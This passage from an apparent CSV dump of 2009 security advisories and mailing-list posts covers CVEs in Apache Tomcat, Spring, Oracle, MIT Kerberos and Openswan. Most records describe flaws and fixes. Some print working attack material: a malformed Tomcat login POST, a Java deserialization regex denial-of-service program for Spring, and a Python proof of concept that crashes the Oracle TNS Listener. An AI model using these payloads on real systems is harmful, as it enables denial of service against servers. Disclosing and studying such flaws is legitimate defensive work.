- apply this patch http://svn.apache.org/viewvc?rev=747840&view=rev
5.5.x users should do one of the following:
- upgrade to 5.5.28 when released
- apply this patch http://svn.apache.org/viewvc?rev=781379&view=rev
4.1.x users should do one of the following:
- upgrade to 4.1.40 when released
- apply this patch http://svn.apache.org/viewvc?rev=781382&view=rev
Example:
The following POST request should trigger an error (500 server error or
empty response, depending on the configuration) if the ROOT web
application is configured to use FORM authentication:
POST /j_security_check HTTP/1.1
Host: localhost
j_username=tomcat&j_password=%
Credit:
This issue was discovered by D. Matscheko and T. Hackner of SEC Consult.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkommckACgkQb7IeiTPGAkP75ACg7XYuld/25X2ltLLTeeQx88UB
pFgAn1f6mIpzU7QUnjF4lsHcR+6lY67B
=a0AC
-----END PGP SIGNATURE-----"
18139,Hardening OSX against CVE-2008-5353,,CVE-2008-5353,"Hi y'all,
regarding the regarding OSX java threat CVE-2008-5353 you can either
join the current panic, or fix the issue in five minutes yourself.
If you belong to the second group of people you can follow
the steps listed here, and also on http://www.illegalaccess.org
Basically the approach takes non-vulnerable classes from
a fixed java version (like sun jdk 1.5.0_18 and makes
it available to the OSX java class loader, which then
fixes the issue). It is a non-intrusive fix, so it
does not impair any patch (if any) that apple will
rollout.
1. Get the src.zip of a recent non-OSX java distribution (like Sun
Java 5/JDK 1.5.0_18 for Linux)
2. unzip src.zip java/util/Calendar.java
3. javac java/util/Calendar.java
4. zip /somepath/FixedCalendar.jar java/util/Calendar*.class
5. In ~/Library/Caches/Java/deployment.properties set option
deployment.javapi.jre.1.5.0.args=-Xbootclasspath/p:/somepath/FixedCalendar.jar
6. Start up a browser, browse to
http://www.java.com/en/download/help/testvm.xml, see the dancing duke,
open Java Console, press s, you should now see FixedCalendar.jar in the
sun.boot.class.path
7. If you are brave, try the PoC exploit on
http://landonf.bikemonkey.org/static/moab-tests/CVE-2008-5353/hello.html,
it should give you a bootstrap failure now
Of course I test my own dog food, and applied the fix
successfully to a set of Tiger and Leopard boxes.
Feedback always appreciated :)
Cheers
Marc"
18401,CVE-2009-1190: Spring Framework Remote Denial of Service Vulnerability,,CVE-2009-1190,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-1190: Spring Framework Remote Denial of Service Vulnerability
Severity: Low
Vendor: SpringSource
Versions Affected:
Spring Framework 1.1.0-2.5.6, 3.0.0.M1-3.0.0.M2
dm Server 1.0.0-1.0.2 (note 2.x not affected since dm Server 2.x requires a 1.6 JDK)
Description:
The j.u.r.Pattern.compile method in Sun 1.5 JDK has a problem ([1],[2]) with exponential compilation times, when using optional groups. A workaround [3] was implemented in 1.4.2_06 but the root cause of poor performance in regex processing was not resolved until JDK 1.6.
JdkRegexpMethodPointcut calls Pattern.compile(source[i]); via it's inherited readObject method (from AbstractRegexpMethodPointcut). When Sun JVM 1.5 driven application with spring.jar in its classpath accepts serializable data, an attacker could use a long regex string with many optional groups to consume enormous CPU resources. And, with a few requests all listeners will be occupied with compiling regex expressions forever.
Mitigation:
* Users of all products may upgrade to JRE/JDK 1.6 which includes the fix for the root cause
* Spring Framework 2.5.6.SEC01 has been released for Community users that includes a workaround to the root cause - see[4] for upgrade steps
* Spring Framework 2.5.6.SR02 is available for Enterprise users that includes a workaround to the root cause; The software can be found in the Customer Portal [5]
* Disable functionality that accepts serializable data from untrusted sources
* Spring Framework 3.0.0.M3 will be released shortly that includes a workaround to the root cause
* dm Server 1.0.2 Community users may replace the Spring Framework 2.5.6 jar with 2.5.6.SEC01 - see[4] for upgrade steps
* dm Server 1.0.3 that includes a workaround to the root cause will be released shortly
* Instrumented Spring Framework 2.5.6.SR02 that includes a workaround to the root cause will be released by April 27, 2009
Example:
public class DoSSpring {
static byte[] getSerialized(Object o) throws Exception {
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(o);
oos.flush();
oos.close();
return baos.toByteArray();
}
public static void main(String[] a) throws Exception{
String thePattern=""(Y)?(K)?(W)?(I)?(U)?(G)?(S)?(E)?(Q)?(C)?(O)?(A)?(M)?(Y)"" +
""?(K)?(W)?(I)?(U)?(G)?(S)?(E)?(Q)?(C)?(O)?(A)?(M)?(Y)?(K)"" +
""?(W)?(I)?(U)?(a)?$"";
String longerPattern = thePattern.substring(0,thePattern.length()-1)+thePattern;
int length = longerPattern.length();
String fakePattern = longerPattern.replaceAll(""."", ""A"");
JdkRegexpMethodPointcut jrmp = new JdkRegexpMethodPointcut();
jrmp.setPattern(fakePattern);
System.out.println(jrmp);
byte[] theArray = getSerialized(jrmp);
int i = 0;
for (; i < theArray.length;i++) {
if (((char)theArray[i])=='A' &&((char)theArray[i+1]=='A')) {
break;
}
}
System.arraycopy(longerPattern.getBytes(), 0, theArray, i, length);
ByteArrayInputStream bis = new ByteArrayInputStream(theArray);
ObjectInputStream ois = new ObjectInputStream(bis);
Object o = ois.readObject(); // returns after a very very long time
}
}
Credit:
This issue was discovered by the RedHat Security Response Team
References:
[1] http://www.packetstormsecurity.org/hitb06/DAY_1_-_Marc_Schoenefeld_-_Pentesting_Java_J2EE.pdf
[2] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2540
[3] http://archive.cert.uni-stuttgart.de/uniras/2005/01/msg00035.html
[4] http://www.springsource.com/securityadvisory
[5] http://www.springsource.com/spring_account_file
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
iEYEARECAAYFAknxfZcACgkQb7IeiTPGAkMX0gCdGsE5fqOd0PcMdcYrLTwyejGp
4p0An1Dwr9T+WsCwytVrztkskexVw84T
=zBj5
-----END PGP SIGNATURE-----"
18426,CVE-2009-0991 PoC,,CVE-2009-0991,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Hi.
Oracle RDBMS CPUapr2009 came out.
http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2009.html
CVE-2009-0991 Listener vulnerability was discovered by me, and here is
attached PoC for it (Python code).
- --
My PGP public key: http://yurichev.com/dennis.yurichev.asc
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkns7r4ACgkQ1YPmFmJG++NmCQCfUPIljnrwnXkGvBA7XtcjVyEx
9DYAoN6fr8DqMRRtYTneEF8IMBrZd7gp
=/VFv
-----END PGP SIGNATURE-----

# TNS Listener (Oracle RDBMS) exploit, cause trap in Listener process
# (more precisely: in function memcpy() called from ncrfintn() function which is located in oranro11.dll)
# Successfully working with Oracle RDBMS Win32 11.1.0.6.0 and Oracle RDBMS Win32 10.2.0.3 with latest CPU patches applied
# Vulnerability discovered by Dennis Yurichev <dennis conus info>
# Fixed in CPUapr2009, CVE-2009-0991
# http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2009.html
from sys import *
from socket import *
sockobj = socket(AF_INET, SOCK_STREAM)
sockobj.connect ((argv[1], 1521))
sockobj.send(
""x00x68x00x00x01x00x00x00x01x3Ax01x2Cx00x00x20x00""
""x7FxFFxC6x0Ex00x00x01x00x00x2Ex00x3Ax00x00x00x00""
""x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00""
""x00x00x00x00x00x00x00x00x00x00x28x43x4Fx4Ex4Ex45""
""x43x54x5Fx44x41x54x41x3Dx28x43x4Fx4Dx4Dx41x4Ex44""
""x3Dx73x65x72x76x69x63x65x5Fx72x65x67x69x73x74x65""
""x72x5Fx4Ex53x47x52x29x29"")
data=sockobj.recv(102400)
sockobj.send(
""x02xdex00x00x06x00x00x00x00x00x00x00x02xd4x20x08""
""xffx03x01x00x12x34x34x34x34x34x78x10x10x32x10x32""
""x10x32x10x32x10x32x54x76x00x78x10x32x54x76x44x00""
""x00x80x02x00x00x00x00x04x00x00x70xe4xa5x09x90x00""
""x23x00x00x00x42x45x43x37x36x43x32x43x43x31x33x36""
""x2dx35x46x39x46x2dx45x30x33x34x2dx30x30x30x33x42""
""x41x31x33x37x34x42x33x03x00x65x00x01x00x01x00x00""
""x00x00x00x00x00x00x64x02x00x80x05x00x00x00x00x04""
""x00x00x00x00x00x00x01x00x00x00x10x00x00x00x02x00""
""x00x00x84xc3xccx07x01x00x00x00x84x2fxa6x09x00x00""
""x00x00x44xa5xa2x09x25x98x18xe9x28x50x4fx28xbbxac""
""x15x56x8ex68x1dx6dx05x00x00x00xfcxa9x36x22x0fx00""
""x00x00x60x30xa6x09x0ax00x00x00x64x00x00x00x00x00""
""x00x00xaax00x00x00x00x01x00x00x17x00x00x00x78xc3""
""xccx07x6fx72x63x6cx00x28x48x4fx53x54x3dx77x69x6e""
""x32x30x30x33x29x00x01x00x00x00x09x00x00x00x01x00""
""x00x00x50xc5x2fx22x02x00x00x00x34xc5x2fx22x00x00""
""x00x00x9cxc5xccx07x6fx72x63x6cx5fx58x50x54x00x09""
""x00x00x00x50xc5x2fx22x04x00x00x00x00x00x00x00x00""
""x00x00x00x00x00x00x00x34xc5xccx07x6fx72x63x6cx5f""
""x58x50x54x00x01x00x00x00x05x00x00x00x01x00x00x00""
""x84xc5x2fx22x02x00x00x00x68xc5x2fx22x00x00x00x00""
""xa4xa5xa2x09x6fx72x63x6cx00x05x00x00x00x84xc5x2f""
""x22x04x00x00x00x00x00x00x00x00x00x00x00x00x00x00""
""x00xfcxc4xccx07x6fx72x63x6cx00x01x00x00x00x10x00""
""x00x00x02x00x00x00xbcxc3xccx07x00x00x00x00xb0x2f""
""xa6x09x00x00x00x00x00x00x00x00x89xc0xb1xc3x08x1d""
""x46x6dxb6xcfxd1xddx2cxa7x66x6dx0ax00x00x00x78x2b""
""xbcx04x7fx00x00x00x64xa7xa2x09x0dx00x00x00x20x2c""
""xbcx04x11x00x00x00x95x00x00x00x02x20x00x80x03x00""
""x00x00x98xc5x2fx22x00x00x00x00x00x00x00x00x0ax00""
""x00x00xb0xc3xccx07x44x45x44x49x43x41x54x45x44x00""
""x28x41x44x44x52x45x53x53x3dx28x50x52x4fx54x4fx43""
""x4fx4cx3dx42x45x51x29x28x50x52x4fx47x52x41x4dx3d""
""x43x3ax5cx61x70x70x5cx41x64x6dx69x6ex69x73x74x72""
""x61x74x6fx72x5cx70x72x6fx64x75x63x74x5cx31x31x2e""
""x31x2ex30x5cx64x62x5fx31x5cx62x69x6ex5cx6fx72x61""
""x63x6cx65x2ex65x78x65x29x28x41x52x47x56x30x3dx6f""
""x72x61x63x6cx65x6fx72x63x6cx29x28x41x52x47x53x3d""
""x27x28x4cx4fx43x41x4cx3dx4ex4fx29x27x29x29x00x4c""
""x4fx43x41x4cx20x53x45x52x56x45x52x00x68xc5x2fx22""
""x34xc5x2fx22x00x00x00x00x05x00x00x00x84xc5x2fx22""
""x04x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00""
""xfcxc4xccx07x6fx72x63x6cx00x09x00x00x00x50xc5x2f""
""x22x04x00x00x00x00x00x00x00x00x00x00x00x00x00x00""
""x00x34xc5xccx07x6fx72x63x6cx5fx58x50x54x00""
)
sockobj.close()"
18561,[SECURITY] CVE-2008-5519: Apache Tomcat mod_jk information disclosure vulnerability,,CVE-2008-5519,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Vulnerability announcement:
CVE-2008-5519: Apache Tomcat mod_jk information disclosure vulnerability
Severity: important
Vendor: The Apache Software Foundation
Versions Affected:
mod_jk 1.2.0 to 1.2.26
Description:
Situations where faulty clients set Content-Length without providing
data, or where a user submits repeated requests very quickly may permit
one user to view the response associated with a different user's request.
Mitigation:
Upgrade to mod_jk 1.2.27 or later
Example:
See description
Credit:
This issue was discovered by the Red Hat Security Response Team
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-jk.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFJ27rAb7IeiTPGAkMRAlsDAJ9qqKPiFnh+rxaxzMZmKIFA5Q5r5QCg2N84
OzL54gpA6e272kokWjK4wZU=
=GKVO
-----END PGP SIGNATURE-----"
18564,MITKRB5-SA-2009-002: ASN.1 decoder frees uninitialized pointer [CVE-2009-0846],,CVE-2009-0846,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2009-002
MIT krb5 Security Advisory 2009-002
Original release: 2009-04-07
Last update: 2009-04-07
Topic: ASN.1 decoder frees uninitialized pointer
[CVE-2009-0846]
ASN.1 GeneralizedTime decoder can free uninitialized pointer
CVSSv2 Vector: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 10
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
CVSSv2 Temporal Score: 7.8
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
[CVE-2009-0846]
An ASN.1 decoder can free an uninitialized pointer when decoding an
invalid encoding. This can cause a Kerberos application to crash, or,
under theoretically possible but unlikely circumstances, execute
arbitrary malicious code. No exploit is known to exist that would
cause arbitrary code execution.
This is an implementation vulnerability in MIT krb5, and is not a
vulnerability in the Kerberos protocol.
IMPACT
======
[CVE-2009-0846] An unauthenticated, remote attacker could cause a
Kerberos application, including the Kerberos administration daemon
(kadmind) or the KDC to crash, and possibly to execute arbitrary code.
Compromise of the KDC or kadmind can compromise the Kerberos key
database and host security on the KDC host. (The KDC and kadmind
typically run as root.) We believe this scenario is highly unlikely,
given the details of the vulnerability.
Third-party applications using MIT krb5 may also be vulnerable.
MITIGATING FACTORS
==================
While it is theoretically possible for an attacker to execute
arbitrary code by exploiting this vulnerability, it is believed to be
more difficult than exploiting other sorts of memory management flaws
such as double-free or heap buffer overflow events. Also, in order to
exploit this vulnerability to remotely execute code, an attacker must
ensure that the uninitialized pointer points to valid address space,
otherwise a null-dereference crash will typically occur.
Some operating systems have hardened malloc implementations that are
not susceptible to this problem. These operating systems are still
vulnerable to a denial of service if the uninitialized pointer points
to invalid address space.
AFFECTED SOFTWARE
=================
* All MIT krb5 releases
* Third-party software using the krb5 library from MIT krb5 releases
FIXES
=====
* The upcoming krb5-1.7 and krb5-1.6.4 releases will contain fixes for
this vulnerability.
* Apply the patch
diff --git a/src/lib/krb5/asn.1/asn1_decode.c b/src/lib/krb5/asn.1/asn1_decode.c
index aa4be32..5f7461d 100644
- --- a/src/lib/krb5/asn.1/asn1_decode.c
+++ b/src/lib/krb5/asn.1/asn1_decode.c
@@ -231,6 +231,7 @@ asn1_error_code asn1_decode_generaltime(asn1buf *buf, time_t *val)
if(length != 15) return ASN1_BAD_LENGTH;
retval = asn1buf_remove_charstring(buf,15,&s);
+ if (retval) return retval;
/* Time encoding: YYYYMMDDhhmmssZ */
if(s[14] != 'Z') {
free(s);
diff --git a/src/tests/asn.1/krb5_decode_test.c b/src/tests/asn.1/krb5_decode_test.c
index 0ff9343..1c427d1 100644
- --- a/src/tests/asn.1/krb5_decode_test.c
+++ b/src/tests/asn.1/krb5_decode_test.c
@@ -485,6 +485,22 @@ int main(argc, argv)
ktest_destroy_keyblock(&(ref.subkey));
ref.seq_number = 0;
decode_run(""ap_rep_enc_part"",""(optionals NULL)"",""7B 1C 30 1A A0 11 18 0F 31 39 39 34 30 36 31 30 30 36 30 33 31 37 5A A1 05 02 03 01 E2 40"",decode_krb5_ap_rep_enc_part,ktest_equal_ap_rep_enc_part,krb5_free_ap_rep_enc_part);
+
+ retval = krb5_data_hex_parse(&code, ""7B 06 30 04 A0 11 18 0F 31 39 39 34 30 36 31 30 30 36 30 33 31 37 5A A1 05 02 03 01 E2 40"");
+ if (retval) {
+ com_err(""krb5_decode_test"", retval, ""while parsing"");
+ exit(1);
+ }
+ retval = decode_krb5_ap_rep_enc_part(&code, &var);
+ if (retval != ASN1_OVERRUN) {
+ printf(""ERROR: "");
+ } else {
+ printf(""OK: "");
+ }
+ printf(""ap_rep_enc_part(optionals NULL + expect ASN1_OVERRUN for inconsistent length of timestamp) "");
+ krb5_free_data_contents(test_context, &code);
+ krb5_free_ap_rep_enc_part(test_context, var);
+
ktest_empty_ap_rep_enc_part(&ref);
}
This patch is also available at
http://web.mit.edu/kerberos/advisories/2009-002-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2009-002-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2009-002.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2009-0846
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0846
CERT: VU#662091
http://www.kb.cert.org/vuls/id/662091
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/D9058C24 2009-01-26 [expires: 2010-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
The asn1_decode_generaltime() function, which decodes DER encodings of
the ASN.1 type ""GeneralizedTime"", can free an uninitialized pointer.
This can cause a Kerberos application to crash, or, under
theoretically possible but unlikely circumstances, execute arbitrary
malicious code. No exploit is known to exist that would cause
arbitrary code execution.
REVISION HISTORY
================
2009-04-07 original release
Copyright (C) 2009 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iQCVAgUBSduVcabDgE/zdoE9AQI+OgQApBBzBcQYG2GfuPIvZhwhJlvaWzSAQpb4
lYgScNNihKVs+xQF8vE5omSXSC/uaRkb5pGd0sa+LAmNCCjwNGT13f5TB6fAKTwS
MRxmJ6whZGTz+3myihBa/pac14hE0q4XTRw/BgCv4lL1B94/K9FyAFSsAWkkV/Mr
H1P8smh5svk=
=z9B1
-----END PGP SIGNATURE-----"
18565,"MITKRB5-SA-2009-001: multiple vulnerabilities in SPNEGO, ASN.1 decoder [CVE-2009-0844 CVE-2009-0845 CVE-2009-0847]",,CVE-2009-0844,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2009-001
MIT krb5 Security Advisory 2009-001
Original release: 2009-04-07
Last update: 2009-04-07
Topic: multiple vulnerabilities in SPNEGO, ASN.1 decoder
[CVE-2009-0844]
SPNEGO implementation can read beyond buffer end
CVSSv2 Vector: AV:N/AC:L/Au:N/C:P/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 8.5
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: Partial
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.7
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
[CVE-2009-0845]
SPNEGO implementation can dereference a null pointer
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
CVSSv2 Temporal Score: 6.1
[CVE-2009-0847]
ASN.1 decoder incorrect length validation
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
CVSSv2 Temporal Score: 6.1
See DETAILS for the expanded CVSSv2 metrics for CVE-2009-0845 and
CVE-2009-0847.
SUMMARY
=======
These are implementation vulnerabilities in MIT krb5, and not
vulnerabilities in the Kerberos protocol.
[CVE-2009-0844]
The MIT krb5 implementation of the SPNEGO GSS-API mechanism can read
beyond the end of a network input buffer. This can cause a GSS-API
application to crash by reading from invalid address space. Under
theoretically possible but very unlikely conditions, a small
information leak may occur. We believe that no successful exploit
exists that could induce an information leak.
[CVE-2009-0845]
The MIT krb5 implementation of the SPNEGO GSS-API mechanism can
dereference a null pointer under error conditions. This can cause a
GSS-API application to crash. This vulnerability was previously
publicly disclosed.
[CVE-2009-0847]
MIT krb5 can perform an incorrect length check inside an ASN.1
decoder. This only presents a problem in the PK-INIT code paths. In
the MIT krb5 KDC or kinit program, this could lead to spurious
malloc() failures or, under some conditions, program crash. We have
heard reports of the spurious malloc() failures, but nobody has yet
made the publicly made the connection to a security issue.
IMPACT
======
[CVE-2009-0844] An unauthenticated, remote attacker could cause a
GSS-API application, including the Kerberos administration daemon
(kadmind) to crash. Under extremely unlikely conditions, there may be
a theoretical possibility of a small information disclosure.
[CVE-2009-0845] An unauthenticated, remote attacker could cause a
GSS-API application, including the Kerberos administration daemon
(kadmind) to crash.
[CVE-2009-0847] An unauthenticated, remote attacker could cause a KDC
or kinit program to crash.
AFFECTED SOFTWARE
=================
[CVE-2009-0844 CVE-2009-0845]
* kadmind in MIT releases krb5-1.5 and later
* FTP daemon in MIT releases krb5-1.5 and later
* Third-party software using the GSS-API library from MIT krb5
releases krb5-1.5 and later
* MIT releases prior to krb5-1.5 did not contain the vulnerable code.
[CVE-2009-0847]
* The kinit program and the KDC from MIT krb5 release krb5-1.6.3.
Prior releases contained the vulnerable code, but the vulnerability
was masked due to operations performed by other code.
FIXES
=====
* The upcoming krb5-1.7 and krb5-1.6.4 releases will contain fixes for
these vulnerabilities.
* Apply the patch, available at
http://web.mit.edu/kerberos/advisories/2009-001-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2009-001-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2009-001.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2009-0844
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0844
CVE: CVE-2009-0845
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0845
CVE: CVE-2009-0847
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0847
CERT: VU#662091
http://www.kb.cert.org/vuls/id/662091
http://krbdev.mit.edu/rt/Ticket/Display.html?id=6402
ACKNOWLEDGMENTS
===============
CVE-2009-0844 was discovered by Product Security at Apple, Inc. We
thank Apple and Sun for suggesting improvements to the patches.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/D9058C24 2009-01-26 [expires: 2010-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
[CVE-2009-0844]
The get_input_token() function in the SPNEGO implementation can read
beyond the end of a network input buffer. A length encoding that
decodes to a value exceeding the number of remaining bytes in the
input buffer will cause the function to copy memory past the end of
the input buffer.
[CVE-2009-0845]
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.1
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
The spnego_gss_accept_sec_context() function in the GSS-API SPNEGO
implementation can dereference a null pointer under error conditions.
Cleanup code in this function can call the helper function
make_spnego_tokenTarg_msg() without first confirming that the value of
the ""sc"" variable is not null, thus causing a null pointer
dereference.
[CVE-2009-0847]
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.1
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
The asn1buf_imbed() function incorrectly checks lengths by comparing
pointers after performing pointer arithmetic using an unchecked input
length. In addition, the functions asn1buf_remove_charstring() and
asn1buf_remove_octetstring() rely on an invariant that is violated
when asn1buf_imbed() incorrectly validates lengths, performing pointer
arithmetic using the invalid length. Consequently, malloc() receives
a very large number as its argument. If the malloc() call somehow
succeeds, the copy from the input buffer is likely to cross unmapped
address space, causing a crash.
Prior to the implementation of PK-INIT, the vulnerability was masked
because no ASN.1 decoder used asn1buf_remove_charstring() or
asn1buf_remove_octetstring() immediately following the use of
asn1buf_imbed(). Protocol elements of PK-INIT require this sequence
of calls in the decoder, unmasking the latent vulnerability.
REVISION HISTORY
================
2009-04-07 original release
Copyright (C) 2009 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iQCVAgUBSduVZabDgE/zdoE9AQI9OgP+OymYyzsFHkUcUWjEVtiFPxKCYh6uZvIj
foqgws9Kv4/TZ44SsJJLURCBgBthm/2coWwlaxaFdDgzXxH/KUW5J9UEBy/rraNx
tLh9CFcuP/uG12N9+Hp9BmlO8euu60cMKRlhAKUuOLTLj74RPMYIID6TE4VgE0g8
UKIvMyadl2I=
=OU63
-----END PGP SIGNATURE-----"
18646,CVE-2009-0790: ISAKMP DPD Remote Vulnerability with Openswan & Strongswan IPsec,,CVE-2009-0790,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
==========================================================================
Openswan & Strongswan Security Notification March 30, 2009
Remote DoS Vulnerability in Openswan & Strongswan IPsec
CVE-2009-0790
==========================================================================
A vulnerability in the Dead Peer Detection (RFC-3706) code was found by
Gerd v. Egidy <gerd.von.egidy intra2net com> of Intra2net AG affecting
all Openswan and all Strongswan releases.
A malicious (or expired ISAKMP) R_U_THERE or R_U_THERE_ACK Dead Peer
Detection packet can cause the pluto IKE daemon to crash and restart. No
authentication or encryption is required to trigger this bug. One spoofed
UDP packet can cause the pluto IKE daemon to restart and be unresponsive
for a few seconds while restarting.
A patch was created by Paul Wouters <paul xelerance com> for Openswan and
Strongswan.
This bug affects the following software releases:
Current branches:
Openswan-2.6.20 and earlier
Strongswan-4.2.13 and earlier
Maintenance mode branches:
Openswan-2.4.13 and earlier
Strongswan-2.8.8 and earlier
End of Life branches:
Superfreeswan-1.9x
Openswan-1.x
Openswan-2.0.x - 2.3.1
Openswan-2.5.x
Everyone is strongly encouraged to upgrade to these minimum versions:
openswan-2.6.21
strongswan-4.2.14
openswan-2.4.14
strongswan-2.8.9
If you cannot upgrade to a new version, please apply the appropriate
patch as listed at http://www.openswan.org/CVE-2009-0790/
Dead Peer Detection is an IPsec IKE Notification message. It uses
an ICOOKIE/RCOOKIE mechanism to match an incoming packet to a know
Security Association (ISAKMP). Unlike most Notification messages, DPD
notifications have no phase2 state association. Incorrect handling of
this exception can cause a NULL pointer dereference on a non-existing
state object 'st'. This bug is triggered in the case where one end has
expired an ISAKMP state, but the other end still uses the old state
to send a DPD Notification.
Since this state-lookup is performed before any encryption or
decryption takes place, as we need to find the proper ISAKMP to locate
the cryptogrpahic key material used for decryption, this bug can be
triggered without going through a phase1 (ISAKMP) negotiation.
When such a packet is received, the pluto daemon crashes and restarts.
Locations for downloading patches and source code:
http://www.openswan.org/ http://www.strongswan.org/
ftp://ftp.openswan.org/openswan/ http://download1.strongswan.org/
ftp://ftp.openswan.fi/pub/openswan/ http://download2.strongswan.org/
Paul Wouters <paul xelerance com>
GPG key: 0xB5CC27E1
==========================================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (GNU/Linux)
iQEVAwUBSdDsnecYBqa1zCfhAQIgkQf9GGalx45xj5xmdXlSB/BZgRXhQW4fNWHp
ZLLt5c40hOSvcmNfgYoIEz/QKpZPjfldvJ+c/08bAyAEQiHmmKkK+cFTlH1LtpDg
1f70lLrsziQ/eK1sQ9EYlFG4gbRfzjl1XZnnijAYvCAS1W12VSIU9gKN0YnHSCjH
ndiGTxtYPEYhzm7QzraYPB28BqBqvdQcMMwbfTThjYHMowzt6fMzFEteCTqJ5YAT
WgNbbbxBz1gNGssoiN4bv0YxaT+701OfKCdgJKKXs61We3twEQ2XKCi6l5Xw/lJe
mrbVHYgUGy/ef70sN03O/vN5o+2If1n0Pib6usdeEcVA0L9RQOIW5A==
=NxrM
-----END PGP SIGNATURE-----"
18808,Re: Vulnerability CVE-2008-3671 - MyReview's vulnerability in the access control system,,CVE-2008-3671,Is there any patch for the v1.9.9 to avoid this security issue?
18841,[SECURITY] CVE-2009-0781 XSS in Apache Tomcat examples web application,,CVE-2009-0781,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2009-0781: Apache Tomcat cross-site scripting vulnerability
Severity: low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 6.0.0 to 6.0.18
Tomcat 5.5.0 to 5.5.27
Tomcat 4.1.0 to 4.1.39
Description:
The calendar application in the examples contains invalid HTML which
renders the XSS protection for the time parameter ineffective. An
attacker can therefore perform an XSS attack using the time attribute.
Mitigation:
6.0.x users should do one of the following:
- remove the examples web application
- apply this patch http://svn.apache.org/viewvc?rev=750924&view=rev
- upgrade to 6.0.19 when released
5.5.x users should do one of the following:
- remove the examples web application
- apply this patch http://svn.apache.org/viewvc?rev=750928&view=rev
- upgrade to 5.5.28 when released
4.1.x users should do one of the following:
- remove the examples web application
